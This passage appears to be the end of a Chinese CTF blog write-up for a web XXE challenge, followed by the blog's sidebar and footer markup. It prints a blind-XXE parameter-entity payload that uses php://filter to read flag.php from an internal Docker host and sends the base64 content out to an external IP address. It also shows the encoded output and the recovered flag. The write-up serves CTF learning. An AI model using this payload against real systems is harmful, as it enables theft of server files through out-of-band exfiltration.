+<p>哦？？圈住include(“flag.php”),尝试直接读,没反应,想着也应该,还有提示SSRF<br>至此,上午工作基本结束,剩下持续发呆直到下午……<br>xxessrf???开始探测内网端口….从8080…..到2018…..<br>嗯中途放弃了…..最后又拿了起来,在队友群又发一下hosts截图</p>
+<p>你那个172.17.0.7是啥?</p>
+<p>…….docker,内网<br>读取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://172.17.0.6/?file=php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://104.236.236.145/?p=%payl;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEQ5d2FIQWdDaTh2WldOb2J5QWlZM1Z0ZEdOMFpudENNV2x1TTE5NGVETmZZVzVrWDNOemNtWmZNWE5mUTI5dmJEOTlJanNLUHo0S0NnPT0=</span><br></pre></td></tr></table></figure>
+<p>…</p>
+<p>&lt;?php<br>//echo “cumtctf{B1in3_xx3_and_ssrf_1s_Cool?}”;<br>?&gt;</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/20/hash长度扩展攻击/" rel="next" title="哈希长度拓展攻击">
+                <i class="fa fa-chevron-left"></i> 哈希长度拓展攻击
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/03/hitctf2018/" rel="prev" title="hitctf-web">
+                hitctf-web <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Altm4nz</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#签到1"><span class="nav-number">1.0.1.</span> <span class="nav-text">签到1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#签到2"><span class="nav-number">1.0.2.</span> <span class="nav-text">签到2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-number">1.0.3.</span> <span class="nav-text">pop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#what？"><span class="nav-number">1.0.4.</span> <span class="nav-text">what？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rce"><span class="nav-number">1.0.5.</span> <span class="nav-text">rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#skysql"><span class="nav-number">1.0.6.</span> <span class="nav-text">skysql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#login"><span class="nav-number">1.0.7.</span> <span class="nav-text">login</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xxe"><span class="nav-number">1.0.8.</span> <span class="nav-text">Xxe</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Altm4nz</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
